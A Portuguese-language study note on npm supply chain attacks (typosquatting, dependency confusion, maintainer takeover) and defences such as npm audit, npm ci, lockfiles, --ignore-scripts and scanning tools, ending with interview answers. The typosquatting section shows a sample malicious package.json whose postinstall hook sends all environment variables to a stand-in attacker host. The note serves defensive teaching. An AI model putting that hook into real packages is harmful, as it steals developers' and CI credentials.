---
title: "Supply chain attacks e npm audit"
created: 2026-05-12
updated: 2026-05-12
type: concept
status: growing
publish: true
tags:
  - node
  - segurança
  - supply-chain
  - npm
aliases:
  - Supply Chain Node
  - npm audit
---

# Supply chain attacks e npm audit

> [!abstract] TL;DR
> Supply chain attacks exploram a cadeia de dependências de um projeto — um pacote npm malicioso instalado transitivamente pode executar código arbitrário na máquina do desenvolvedor ou no servidor de CI antes mesmo do código chegar à produção. O npm registra mais de dois milhões de pacotes, tornando vetores como typosquatting, dependency confusion e tomada de conta de maintainer ameaças concretas e frequentes. A mitigação começa com `npm ci` (lockfile exato), `npm audit` integrado ao CI, ferramentas de análise comportamental como socket.dev e snyk, e políticas de registry privado que impedem que pacotes desconhecidos sejam instalados.

## O que é

Um **supply chain attack** (ataque à cadeia de suprimentos) em software ocorre quando um agente malicioso compromete não o alvo diretamente, mas algum componente que o alvo consome: uma biblioteca, uma ferramenta de build ou um script de instalação. No ecossistema Node.js, o vetor mais comum é o registro público do npm.

O ataque pode acontecer em qualquer ponto da cadeia:

1. O desenvolvedor instala um pacote tipograficamente parecido com o legítimo (typosquatting).
2. Um sistema de CI resolve um nome de pacote interno contra o registro público antes do privado (dependency confusion).
3. Um pacote legítimo e popular é transferido para um novo maintainer ou tem sua conta comprometida, que então publica uma versão maliciosa.
4. Uma dependência transitiva (dependência de uma dependência) é comprometida sem que o projeto tenha qualquer visibilidade direta.

O impacto pode ser catastrófico: exfiltração de tokens de CI, credenciais de ambiente, dados de produção, ou execução de ransomware — tudo acionado pelo simples `npm install`.

## Como funcionam supply chain attacks

### Typosquatting

O atacante registra um pacote cujo nome se assemelha ao de um pacote popular, contando com erros de digitação comuns. Exemplos reais documentados:

| Pacote legítimo | Pacote falso        |
|-----------------|---------------------|
| `lodash`        | `1odash` (L→1)      |
| `express`       | `expres`            |
| `cross-env`     | `crossenv`          |
| `event-stream`  | comprometido via maintainer takeover (2018) |

O script `postinstall` do pacote falso é executado automaticamente durante `npm install`, podendo enviar variáveis de ambiente para um servidor externo:

```json
// package.json de pacote malicioso
{
  "name": "1odash",
  "scripts": {
    "postinstall": "node -e \"require('https').get('https://evil.example/?' + Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
  }
}
```

Proteção imediata: nunca copie nomes de pacotes de fontes não-confiáveis e use `--ignore-scripts` em ambientes de CI quando possível.

### Dependency confusion

Dependency confusion (também chamado de namespace confusion) ocorre quando uma organização usa pacotes internos publicados em um registry privado com o mesmo nome (sem escopo) que algum pacote que poderia existir no registro público.

O npm, por padrão, prefere a versão de maior número de versão encontrada em qualquer registry configurado. Um atacante que descobre o nome de um pacote interno (via `package.json` vazado, job postings ou erros de configuração) pode publicar no npm público uma versão com número de versão muito alto (ex: `99.0.0`), que será instalada no lugar da interna.

```bash
# registry privado tem @acme/auth@1.2.0
# atacante publica no npm público: acme-auth@99.0.0 (sem escopo)
# se o projeto referencia "acme-auth" sem escopo e sem registry fixado:
npm install  # resolve acme-auth@99.0.0 do npm público → código malicioso
```

**Mitigação:** sempre use escopos (`@acme/auth`) e fixe o registry no `.npmrc`:

```ini
# .npmrc
@acme:registry=https://registry.acme.internal
```

### Malicious maintainer takeover

Um pacote amplamente usado pode ser comprometido por:

- **Credenciais vazadas:** conta npm do maintainer sem 2FA e senha reutilizada.
- **Transferência voluntária:** maintainer transfere ownership para outra pessoa sem due diligence (ex: `event-stream` em 2018, com 2M downloads/semana).
- **Social engineering:** atacante finge ser colaborador ou oferece "ajuda com manutenção" e obtém publish access.

Após o comprometimento, a versão maliciosa é publicada e instalada por todos os projetos que não têm a versão fixada no lockfile. O lockfile (`package-lock.json`) mitiga isso porque registra o hash exato de cada pacote — qualquer alteração no conteúdo do pacote produz hash diferente e falha na instalação com `npm ci`.

## `npm audit` e `npm audit fix`

O comando `npm audit` consulta o banco de dados de vulnerabilidades do npm (baseado no GitHub Advisory Database) e compara com as dependências instaladas.

### Output e interpretação

```bash
npm audit
```

Exemplo de output real:

```
# npm audit report

semver  <5.7.2 || >=6.0.0 <6.3.1 || >=7.0.0 <7.5.2
Severity: critical
Regular Expression Denial of Service in semver - https://github.com/advisories/GHSA-c2qf-rxjj-qqgw
fix available via `npm audit fix`
node_modules/semver

6 vulnerabilities (1 low, 2 moderate, 2 high, 1 critical)
```

Campos relevantes:

| Campo       | Significado                                                     |
|-------------|-----------------------------------------------------------------|
| CVE/GHSA    | Identificador da vulnerabilidade (ex: `CVE-2022-25883`)         |
| Severity    | `critical` / `high` / `moderate` / `low` (CVSS score)          |
| fix available | Se existe versão corrigida compatível com semver do projeto   |
| node_modules | Qual pacote está vulnerável (pode ser transitivo)             |

### `npm audit --json` para CI/CD

Em pipelines de CI, use o formato JSON para parsear resultados programaticamente:

```bash
npm audit --json | jq '.metadata.vulnerabilities'
# { "info": 0, "low": 1, "moderate": 2, "high": 2, "critical": 1, "total": 6 }

# Falhar o build apenas se houver critical ou high:
AUDIT=$(npm audit --json)
CRITICAL=$(echo "$AUDIT" | jq '.metadata.vulnerabilities.critical')
HIGH=$(echo "$AUDIT" | jq '.metadata.vulnerabilities.high')
if [ "$CRITICAL" -gt 0 ] || [ "$HIGH" -gt 0 ]; then
  echo "Build failed: critical or high vulnerabilities found"
  exit 1
fi
```

### `npm audit fix` vs `npm audit fix --force`

```bash
# Aplica apenas patches que respeitam o semver do package.json
npm audit fix

# Força upgrades de major version (pode introduzir breaking changes)
npm audit fix --force
```

A diferença crítica:

- `npm audit fix` atualiza apenas para versões compatíveis com as restrições semver existentes (`^`, `~`, etc.). **Seguro para usar em projetos em produção.**
- `npm audit fix --force` ignora restrições semver e pode fazer upgrades de major version que quebram a API. **Sempre revisar o diff de `package.json` e `package-lock.json` após usar.**

## Ferramentas complementares

### socket.dev

Socket.dev vai além do audit baseado em CVE: analisa o **comportamento** do pacote antes de ele ser instalado, detectando:

- Acesso a `process.env` em scripts de instalação
- Chamadas de rede em `postinstall`
- Ofuscação de código
- Dependências adicionadas em patches recentes

```bash
# CLI local
npx socket npm install lodash

# Output inclui análise de supply chain:
# ✓ No install scripts  ✓ No network access  ✓ No env access
```

### snyk

Snyk oferece análise de SCA (Software Composition Analysis) com integração nativa ao GitHub/GitLab/CI:

```bash
# Instalar CLI
npm install -g snyk

# Autenticar e escanear
snyk auth
snyk test

# Output com política: falhar se CVSS >= 7.0
snyk test --severity-threshold=high

# Monitorar projeto continuamente (envia resultado ao dashboard)
snyk monitor
```

### osv-scanner (Google OSV)

Scanner open source do Google que usa o banco OSV (Open Source Vulnerabilities):

```bash
# Escanear pelo lockfile
osv-scanner --lockfile package-lock.json

# Output em JSON para integração com pipelines
osv-scanner --lockfile package-lock.json --format json
```

### GitHub Dependabot

Configurado via `.github/dependabot.yml`, o Dependabot abre PRs automáticos de atualização de dependências:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    ignore:
      - dependency-name: "some-legacy-package"
        update-types: ["version-update:semver-major"]
```

## Estratégias de mitigação

### `npm ci` vs `npm install`

| Característica                 | `npm install`            | `npm ci`                        |
|--------------------------------|--------------------------|---------------------------------|
| Usa lockfile                   | Opcional (atualiza se necessário) | Obrigatório (falha se divergir) |
| Atualiza `package-lock.json`   | Sim (pode)               | Nunca                           |
| Velocidade                     | Mais lento               | Mais rápido (sem resolução)     |
| Uso recomendado                | Desenvolvimento local    | CI/CD e builds de produção      |

```bash
# Em Dockerfile e pipelines de CI: sempre usar npm ci
FROM node:22-alpine
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --omit=dev
COPY . .
```

### Commit do lockfile

O `package-lock.json` deve **sempre** estar no controle de versão. Ele registra o hash sha512 de cada pacote:

```json
// trecho de package-lock.json
"node_modules/semver": {
  "version": "7.6.2",
  "resolved": "https://registry.npmjs.org/semver/-/semver-7.6.2.tgz",
  "integrity": "sha512-FNAIBWCx9qcRhoHcgcJ0gvU7SN1lYU2ZXuSfl04bSC5OpvDHFyJCjdNHomPXxjQlCBU67YW64PzY7/VIEH7F2w=="
}
```

Se um atacante alterar o conteúdo de um pacote publicado, o hash não baterá e `npm ci` falhará com `integrity checksum failed`.

### `--ignore-scripts`

Desabilita a execução de scripts `preinstall`, `postinstall`, `prepare` e outros hooks do npm durante a instalação:

```bash
npm ci --ignore-scripts

# Ou configurar globalmente no .npmrc do projeto:
# .npmrc
ignore-scripts=true
```

> **Atenção:** alguns pacotes legítimos precisam de `postinstall` para compilar módulos nativos (ex: `bcrypt`, `sharp`). Nesse caso, execute os scripts manualmente após a instalação ou use imagens Docker que já incluem os binários pré-compilados.

### Registry privado e allowlist

```ini
# .npmrc — forçar todos os pacotes @acme a usar registry interno
@acme:registry=https://registry.acme.internal

# Bloquear qualquer pacote não aprovado (com Verdaccio ou Artifactory)
registry=https://registry.acme.internal
```

Com Verdaccio, você pode configurar uma allowlist explícita de pacotes permitidos, rejeitando qualquer pacote fora da lista.

## Verificação de integridade

### `npm pack --dry-run`

Antes de publicar um pacote, simule o que seria incluído no tarball:

```bash
npm pack --dry-run
# Lista todos os arquivos que seriam publicados
# Útil para garantir que .env, chaves privadas ou segredos não estão incluídos
```

### `npx is-my-node-vulnerable`

Verifica se a versão do Node.js em execução possui CVEs conhecidos:

```bash
npx is-my-node-vulnerable
# Using Node.js 22.2.0
# ✓ No known vulnerabilities in this Node.js version
```

Integrar em scripts de CI para bloquear builds em runtimes com CVEs críticos:

```bash
# CI step
npx is-my-node-vulnerable || exit 1
```

### Verificação de checksums no lockfile

O lockfile registra `integrity` como `sha512` em base64. Para verificar manualmente um pacote específico:

```bash
# Baixar o tarball e calcular o hash
curl -s https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz | \
  openssl dgst -sha512 -binary | \
  openssl base64 -A
# Comparar com o campo "integrity" no package-lock.json
```

## Armadilhas

> [!danger] `npm audit fix --force` introduz breaking changes silenciosamente
> **Problema:** `npm audit fix --force` pode fazer upgrade de major versions de dependências transitivas, quebrando APIs que seu código usa indiretamente. O comando não exige confirmação e aplica todas as mudanças de uma vez, tornando difícil identificar qual upgrade causou a regressão.
> **Solução:** Nunca use `--force` em automação. Em vez disso, use `npm audit fix` sem `--force`, revise o diff completo de `package.json` e `package-lock.json`, execute a suite de testes antes de commitar, e trate upgrades de major version como feature branches separados com testes dedicados.

> [!danger] Scripts `postinstall` maliciosos executam antes da revisão de código
> **Problema:** O hook `postinstall` de um pacote npm é executado imediatamente após `npm install`, com as mesmas permissões do processo que iniciou a instalação. Um pacote comprometido pode exfiltrar `AWS_ACCESS_KEY_ID`, `DATABASE_URL` e outros segredos presentes no ambiente antes que qualquer revisão aconteça.
> **Solução:** Use `npm ci --ignore-scripts` em ambientes de CI. Não execute `npm install` em máquinas de CI com credenciais de produção no ambiente. Avalie cada pacote novo com socket.dev antes de adicionar ao projeto. Considere usar um registry privado com allowlist aprovada.

## Em entrevista

**Q: How do you protect your Node.js project from supply chain attacks?**

A: My approach is defense in depth across three layers. First, at install time: I always commit the lockfile, use `npm ci` instead of `npm install` in CI/CD so the lockfile is enforced exactly, and run `npm audit` with `--json` to fail the build on critical or high CVEs. I also use `--ignore-scripts` in CI to prevent malicious postinstall hooks from running. Second, at review time: I use socket.dev to analyze behavioral signals in new packages before merging — things like unexpected network access or environment variable reads in install scripts. Third, at the registry level: for internal packages, I always use scoped names with `@org/` prefix and lock them to a private registry in `.npmrc` to prevent dependency confusion attacks. For teams, I add Dependabot with weekly PRs to keep dependencies current and auditable.

---

**Q: What's the difference between `npm install` and `npm ci` in a CI/CD context?**

A: The key difference is how they treat the lockfile. `npm install` treats `package-lock.json` as advisory — it will regenerate or update it if there's a discrepancy with `package.json`. `npm ci` treats the lockfile as authoritative — if `package.json` and `package-lock.json` are out of sync, it fails immediately rather than silently updating. In CI/CD, this matters for two reasons: reproducibility and security. Reproducibility means every build gets exactly the same dependency tree, which eliminates "works on my machine" issues. Security means that if someone tampered with a package after it was locked — changing the tarball at the same version — `npm ci` catches the integrity hash mismatch and aborts. I never use `npm install` in a Dockerfile or CI pipeline; it always has to be `npm ci`.

---

**Q: How would you handle a critical vulnerability in a transitive dependency?**

A: First, I triage: is this vulnerability actually exploitable in our context? Many CVEs in transitive dependencies affect codepaths that the consuming package never invokes. I check the GHSA advisory for the attack vector and affected function. If it's exploitable, I run `npm audit fix` — without `--force` — to see if there's a semver-compatible fix. If there is, I apply it, run the full test suite, and merge. If there's no compatible fix, I have a few options: I can use `npm audit fix --force` as a branch with careful testing of the major version upgrade; I can apply an `overrides` entry in `package.json` to force a specific version of the transitive dependency (available since npm 8.3); or, if the vulnerability is critical and there's no fix at all, I evaluate replacing the parent dependency entirely. Throughout this process I document the decision in the PR description — either the fix applied or the rationale for accepting the risk temporarily with a tracking ticket.

---

**Q: What is dependency confusion and how do you prevent it?**

A: Dependency confusion is an attack where an adversary registers a package on the public npm registry with the same name as an internal package used by an organization, but at a higher version number. When npm resolves dependencies and finds a higher version on the public registry than on the private one, it installs the public — malicious — version instead. The root cause is using unscoped package names for internal packages. The prevention is straightforward: always use scoped package names for internal packages — `@acme/auth` instead of `acme-auth` — and in `.npmrc`, explicitly map that scope to the private registry: `@acme:registry=https://your-private-registry`. This way npm never even queries the public registry for packages in your organization's scope.

## Vocabulário

- **supply chain attack** — ataque que compromete um componente da cadeia de dependências (biblioteca, ferramenta, registry) para atingir o alvo indiretamente, sem atacar seu código diretamente
- **typosquatting** — registro de pacote com nome propositalmente similar ao de um pacote popular, explorando erros de digitação para distribuir código malicioso
- **dependency confusion** — ataque em que um pacote com o mesmo nome de uma dependência interna é publicado no registry público com número de versão mais alto, causando instalação do pacote malicioso
- **lockfile** — arquivo (`package-lock.json` no npm, `yarn.lock` no Yarn) que registra a versão exata e o hash de integridade de cada dependência instalada, garantindo builds reprodutíveis e detectando adulterações
- **CVE** — Common Vulnerabilities and Exposures; identificador padronizado atribuído a vulnerabilidades de segurança divulgadas publicamente (ex: `CVE-2022-25883`); complementado pelo GHSA (GitHub Security Advisory) no ecossistema npm
- **SCA** — Software Composition Analysis; categoria de ferramentas (snyk, socket.dev, osv-scanner) que analisam dependências de um projeto em busca de vulnerabilidades conhecidas, licenças problemáticas e riscos de supply chain
- **postinstall hook** — script npm executado automaticamente após a instalação de um pacote; vetor de execução de código malicioso em supply chain attacks; mitigado com `--ignore-scripts`
- **integrity hash** — checksum `sha512` em base64 registrado no lockfile para cada pacote; usado por `npm ci` para verificar que o conteúdo do tarball baixado corresponde exatamente ao que foi lockado

## Veja também

- [[03-Dominios/Node/Segurança/index|Segurança]] — MOC do galho 8; visão completa da trilha de segurança Node.js
- [[JavaScript/Backend/Node.js|Node.js]] — tronco da trilha; fundamentos de Node.js
- [[03-Dominios/Node/Tooling e ecossistema moderno/index|Tooling e ecossistema moderno]] — galho 7; npm, package managers e ecossistema de ferramentas
- [npm audit — documentação oficial](https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities)
- [socket.dev](https://socket.dev) — análise comportamental de pacotes npm
- [OSV — Open Source Vulnerabilities](https://osv.dev) — banco de dados de vulnerabilidades open source do Google
- [GitHub Advisory Database](https://github.com/advisories) — base de dados que alimenta o `npm audit`
